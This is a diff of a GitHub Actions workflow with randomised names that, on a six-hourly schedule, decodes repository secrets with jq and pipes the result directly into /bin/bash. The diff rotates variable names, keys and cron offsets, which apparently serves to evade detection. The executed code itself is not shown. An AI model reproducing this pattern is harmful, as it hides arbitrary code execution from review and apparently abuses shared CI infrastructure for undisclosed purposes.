@@ -1,10 +1,10 @@
 name: zhonglianhua2341
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '33 1/6 * * *'
-jobs:  # 27094
+    - cron: '13 0/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,18 +12,19 @@ jobs:  # 27094
       - uses: actions/checkout@v4
       - name: zhonglianhua2341
         env:
-          yct32: ${{ secrets.yct32 }}
+          xeujy9: ${{ secrets.xeujy9 }}
         run: |
-          echo $yct32 | jq -r .h0026 | /bin/bash
-          echo $pv0447 | jq -r .f867 | /bin/bash
-          echo $cfwzz5648 | jq -r .gtngi935 | /bin/bash
-          echo $irqnx38 | jq -r .wwrlv9 | /bin/bash
-          echo $jgjj82 | jq -r .lrqlg13334 | /bin/bash
-          echo $ip6 | jq -r .oxqv51 | /bin/bash
-          echo $crq9068 | jq -r .ocvux97 | /bin/bash
-          echo $cop962 | jq -r .c34616 | /bin/bash
-          echo $hfrz3338 | jq -r .e4428 | /bin/bash
-          echo $ssc3 | jq -r .mh33243 | /bin/bash
-          echo $ywmk230 | jq -r .jp022 | /bin/bash
-          echo $ywht0286 | jq -r .kxhsl4 | /bin/bash
+          echo $xeujy9 | jq -r .n49 | /bin/bash
+          echo $jqord580 | jq -r .yh5 | /bin/bash
+          echo $b1877 | jq -r .zay7 | /bin/bash
+          echo $nogai155 | jq -r .e9935 | /bin/bash
+          echo $j4 | jq -r .c8749 | /bin/bash
+          echo $lcmqa5 | jq -r .yprak47787 | /bin/bash
+          echo $tha41466 | jq -r .xqc117 | /bin/bash
+          echo $rvu4 | jq -r .s53 | /bin/bash
+          echo $v442 | jq -r .yry66 | /bin/bash
+          echo $mesv29621 | jq -r .rsqg374 | /bin/bash
+          echo $ikgeq5589 | jq -r .chd751 | /bin/bash
+          echo $fuakt48 | jq -r .yyoju2680 | /bin/bash
+          echo $gftep00 | jq -r .ha32 | /bin/bash
 
